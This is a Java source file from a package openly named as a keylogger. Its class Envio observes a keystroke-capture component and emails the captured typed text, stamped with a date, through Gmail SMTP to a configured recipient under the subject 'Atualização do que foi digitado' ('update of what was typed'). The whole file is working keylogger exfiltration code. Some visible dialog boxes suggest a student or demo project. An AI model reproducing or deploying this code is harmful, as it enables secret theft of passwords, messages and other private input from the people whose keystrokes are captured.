package br.com.keylogger;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Properties;

import javax.mail.Address;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.JOptionPane;

public class Envio implements EmailIF, Observer {
	private Properties props;
	private Session session;
	private Message message;
	private Subject subject;
	private String email;
	private String password;
	private String destinatario;
	private Date data;
	private SimpleDateFormat sdf;
	
	public Envio(Subject subject, String email, String password, String destinatario) {
		this.subject = subject;
		this.email = email;
		this.password = password;
		this.destinatario = destinatario;
		this.props = new Properties();
		props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.socketFactory.port", "465");
        props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.port", "465");
	}
	
	public Envio(Subject subject) {
		this.subject = subject;
		this.props = new Properties();
		props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.socketFactory.port", "465");
        props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.port", "465");
	}

	@Override
	public boolean enviarEmail(String destinatario, String mensagem) {
		this.session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(email, password);
			}
		});
		this.data = new Date();
		this.sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
		mensagem += "\n" + this.sdf.format(this.data);
		this.session.setDebug(false);
		JOptionPane.showMessageDialog(null, "ENVIANDO...\n"+mensagem);
		try {
			this.message = new MimeMessage(this.session);
			this.message.setFrom(new InternetAddress(this.email));
			
			Address[] destinatarios = InternetAddress.parse(destinatario);
			
			this.message.setRecipients(Message.RecipientType.TO, destinatarios);
			this.message.setSubject("Atualização do que foi digitado.");
			this.message.setText(mensagem);
			Transport.send(this.message);
			JOptionPane.showMessageDialog(null, "ENVIADO...");
			return true;
		} catch(MessagingException e) {
			throw new RuntimeException(e);
		}
	}
	
	public String getEmail() {
		return email;
	}

	public void setEmail(String email) {
		this.email = email;
	}

	public String getPassword() {
		return password;
	}

	public void setPassword(String password) {
		this.password = password;
	}

	public String getDestinatario() {
		return destinatario;
	}

	public void setDestinatario(String destinatario) {
		this.destinatario = destinatario;
	}

	@Override
	public void update() {
		if(this.subject instanceof Captura) {
			Captura captura = (Captura) this.subject;
			this.enviarEmail(this.destinatario, captura.getoQueFoiEscrito());
		}
		
	}

}
